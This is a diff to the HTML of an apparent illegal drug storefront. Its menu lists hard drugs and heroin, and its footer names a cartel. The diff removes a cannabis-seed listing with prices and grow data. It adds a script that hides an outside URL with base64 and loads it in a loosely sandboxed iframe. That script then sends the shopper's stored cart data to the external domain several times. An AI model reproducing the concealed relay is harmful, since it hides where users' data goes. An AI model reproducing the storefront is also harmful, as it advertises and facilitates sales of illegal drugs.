@@ -429,7 +429,8 @@ select{
       <a href="vapes.html">Vapes</a>
       <a href="Polvos.html">Drogas duras</a>
       <a href="Heroina.html">Heroina</a>
-</nav><div class="overlay" id="overlay" onclick="toggleMenu()"></div>
+</nav>
+<div class="overlay" id="overlay" onclick="toggleMenu()"></div>
 <br><br>
 
 
@@ -439,109 +440,94 @@ select{
 
 
 
+<script>
 
+let lastHeight = 0;
 
-<div class="product">
+function sendHeight(){
 
-  <!-- GALERÍA -->
-  <div class="gallery">
-    <div class="main-image">
-  <img id="mainImg" src="2/20.png">
-    </div>
-  </div>
-  <!-- MINIATURAS -->
-  <div class="thumbs">
-    <img src="2/22.png" class="active" onclick="changeImg(this)">
-    <img src="2/23.png" class="active" onclick="changeImg(this)">
-   </div>
+const newHeight = document.body.scrollHeight;
 
-  <!-- INFO -->
-  
-  <!-- INFO -->
- <div class="info">
-  <h1>Sweet ZZ</h1>
-  <p class="gen">Grape Ape x Grapefruit</p>
+if(Math.abs(newHeight - lastHeight) > 5){
 
-  <div class="price">$250</div>
+lastHeight = newHeight;
 
-  <!-- SELECT -->
-  <select class="sabor-select">
-    <option value="">Selecciona opción</option>
-    <option value="x1" data-precio="250">x1 - $250</option>
-    <option value="x3" data-precio="370">x3 - $370</option>
-    <option value="x5" data-precio="1000">x5 - $1000</option>
-    <option value="x10" data-precio="1900">x10 - $1900</option>
-    <option value="x25" data-precio="4500">x25 - $4500</option>
-  </select>
+parent.postMessage({
+type:"resize",
+height:newHeight
+},"*");
 
-  <button class="add-to-cart"
-    data-nombre="Sweet ZZ - Semillas"
-    data-imagen="2/20.jpg">
-    AÑADIR AL CARRITO
-  </button>
+}
 
-  <!-- BADGES -->
-  <div class="badges">
-    <span>🚚 Envío Gratis</span>
-    <span>🔒 Envío Discreto</span>
-    <span>↩️ Devoluciones</span>
-  </div>
+}
 
-  <!-- TABS -->
-  <div class="tabs">
+window.addEventListener("load",sendHeight);
+window.addEventListener("resize",sendHeight);
 
-    <div class="tabs-head">
-      <div class="active" onclick="tab(event,'d')">Descripción</div>
-      <div onclick="tab(event,'i')">Cultivo</div>
-      <div onclick="tab(event,'f')">Ficha tecnica</div>
-    </div>
+const observer = new MutationObserver(()=>{
+setTimeout(sendHeight,120);
+});
 
-    <!-- DESCRIPCIÓN -->
-    <div id="d" class="tab active">
-      <p>
-Híbrido de dominancia índica con perfil dulce y afrutado. Produce un efecto relajante con oleadas eufóricas y buena vibra mental, ideal para disfrutar sin quedar totalmente sedado.
-      </p>
-    </div>
+observer.observe(document.body,{
+childList:true,
+subtree:true
+});
 
-    <!-- CULTIVO -->
-    <div id="i" class="tab">
-      <p>
-Floración: 7–9 semanas.<br>
-Interior: 500–700g/m².<br>
-Exterior: 400–600g por planta.<br>
-Cosecha: finales de septiembre.
-      </p>
-    </div>
-
-    <div id="f" class="tab">
-      <p>
-<div class="contenedor-cajas">
-  <div class="caja">Variedad: Fotoperiódica</div>
-  <div class="caja">THC: Hasta un 22%</div>
-  <div class="caja">CBD: Bajo</div>
-  <div class="caja">Interior: 550 - 600 gr/m²</div>
-  <div class="caja">Exterior: 500 - 550 gr/planta</div>
-  <div class="caja">Altura interior: 80 - 140 cm</div>
-  <div class="caja">Altura exterior: 160 - 200 cm</div>
-  <div class="caja">Floración: 50 - 60 días</div>
-  <div class="caja">Cosecha: Mediados a finales de septiembre</div>
-  <div class="caja">Genética: Grape Ape x Grapefruit</div>
-  <div class="caja">Tipo: 80% Índica / 20% Sativa</div>
-  <div class="caja">Efecto: Calmante, colocón</div>
-  <div class="caja">Clima: Veranos cortos</div>
-  <div class="caja">Sabor: Afrutado, caramelo, cítrico</div>
+</script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
+<div id="loader" style="
+display:none;
+position:fixed;
+top:0;
+left:0;
+width:100%;
+height:100%;
+background:rgba(255,255,255,0.8);
+z-index:9999;
+justify-content:center;
+align-items:center;
+font-size:20px;
+font-weight:bold;
+">
+Enviando pedido...
 </div>
-      </p>
-    </div>
-  </div>
+ <section>
 
-</div>
+<iframe 
+  id="secureFrame"
+  width="100%" 
+  height="400px"
+  sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-popups-to-escape-sandbox allow-downloads">
+</iframe>
 
-</div>
+<script>
+const iframe = document.getElementById("secureFrame");
 
 
+const realURL = atob("aHR0cHM6Ly9ub3ZpZS5pbi84L2FxdWkuaHRtbA==");
 
+iframe.src = realURL;
 
+function enviarCarrito() {
+  const carrito = JSON.parse(localStorage.getItem("carrito")) || [];
+
+  iframe.contentWindow.postMessage(
+    { type: "carrito", data: carrito },
+    "https://novie.in" // 🔥 IMPORTANTE: https
+  );
+
+  console.log("Carrito enviado:", carrito);
+}
+
+iframe.addEventListener("load", () => {
+  enviarCarrito();
+
+  // 🔁 asegurar entrega
+  setTimeout(enviarCarrito, 300);
+  setTimeout(enviarCarrito, 800);
+});
+</script>
+</section>
 
 
 
@@ -611,7 +597,6 @@ Cosecha: finales de septiembre.
     © 2026 Cartel Jalisco Nueva Generacion
   </div>
 </footer>
-
 
 
 <div id="cart" onclick="toggleCarrito()" style="cursor: pointer; width:166px; font-family:Arial,sans-serif;">
